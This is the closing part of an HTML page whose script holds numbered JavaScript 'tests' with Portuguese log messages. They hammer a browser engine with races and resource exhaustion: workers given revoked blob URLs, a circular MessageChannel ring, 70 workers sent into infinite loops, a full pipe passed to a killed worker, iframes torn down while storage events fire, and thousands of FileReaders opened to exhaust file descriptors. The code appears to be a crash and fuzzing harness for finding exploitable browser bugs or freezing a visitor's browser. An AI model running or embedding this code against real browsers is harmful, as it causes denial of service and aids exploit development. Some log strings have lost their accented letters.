        const uW = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const ws = [];
        try {
            for(let i=0; i<15; i++) {
                const w = new Worker(uW);
                w.postMessage(u);
                ws.push(w);
            }
            setTimeout(()=>{
                URL.revokeObjectURL(u);
                ws.forEach(w=>w.terminate());
                log("SUCESSO: VFS Handles race condition.");
            },80);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest118() {
        log("Init Test 118: Circular IPC Panic...");
        const ring = [];
        const size = 300;
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const next = (i+1)%size;
                ring[i].port1.postMessage("L",[ring[next].port1]);
            }
            const wCode = `onmessage=e=>{try{e.data.close()}catch(x){}}`;
            const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
            const w = new Worker(u);
            w.postMessage(ring[0].port2,[ring[0].port2]);
            setTimeout(()=>{
                w.terminate();
                for(let i=1; i<size; i++) try{ring[i].port2.close()}catch(x){}
                log("SUCESSO: Anel de refcount rfo no kernel.");
            },250);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest119() {
        log("Init Test 119: Broadcast Storm Kill...");
        const name = "storm_"+Date.now();
        const code = `const bc=new BroadcastChannel('${name}');bc.onmessage=()=>{postMessage('a');while(1);}`;
        const u = URL.createObjectURL(new Blob([code],{type:'text/javascript'}));
        const ws = [];
        try {
            for(let i=0; i<70; i++) ws.push(new Worker(u));
            const bc = new BroadcastChannel(name);
            bc.postMessage("wake");
            setTimeout(()=>{
                ws.forEach(w=>w.terminate());
                bc.close();
                log("SUCESSO: Scheduler mass kill.");
            },120);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest120() {
        log("Init Test 120: Pipe Zombie Transfer...");
        const ch = new MessageChannel();
        const load = new Uint8Array(1024*64).fill(0xAA);
        const wCode = `onmessage=e=>{try{e.data.close()}catch(x){}}`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            let s=0;
            const iv = setInterval(()=>{
                for(let k=0; k<30; k++){
                    ch.port1.postMessage(load);
                    s++;
                }
                if(s>4000){
                    clearInterval(iv);
                    const w = new Worker(u);
                    w.postMessage(ch.port2,[ch.port2]);
                    setTimeout(()=>{
                        w.terminate();
                        ch.port1.close();
                        log("SUCESSO: Pipe cheio em processo morto.");
                    },50);
                }
            },5);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest121() {
        log("Init Test 121: Storage Listener Race...");
        const f = [];
        try {
            for(let i=0; i<90; i++){
                const fr = document.createElement('iframe');
                document.body.appendChild(fr);
                fr.contentWindow.addEventListener('storage',()=>{const z=new Uint8Array(200);});
                f.push(fr);
            }
            let k=0;
            const iv = setInterval(()=>{
                localStorage.setItem("x"+k,Math.random());
                if(k%3===0 && f.length>0){
                    const idx = Math.floor(Math.random()*f.length);
                    const r = f.splice(idx,1)[0];
                    document.body.removeChild(r);
                }
                if(k++>350){
                    clearInterval(iv);
                    log("SUCESSO: Lista global de eventos instvel.");
                }
            },2);
        } catch(e) { log("FALHA: " + e.message); }
    }

    function runTest122() {
        log("Init Test 122: FD Table Contention...");
        const b = new Blob([new Uint8Array(1024*1024*12).fill(0x00)]);
        const rs = [];
        try {
            const limit = 7000;
            for(let i=0; i<limit; i++){
                const fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(i*40, i*40+10));
                rs.push(fr);
                if(i%300===0){
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCESSO: Exausto massiva de File Descriptors.");
        } catch(e) { log("FALHA: " + e.message); }
    }
</script>

</body>
</html>
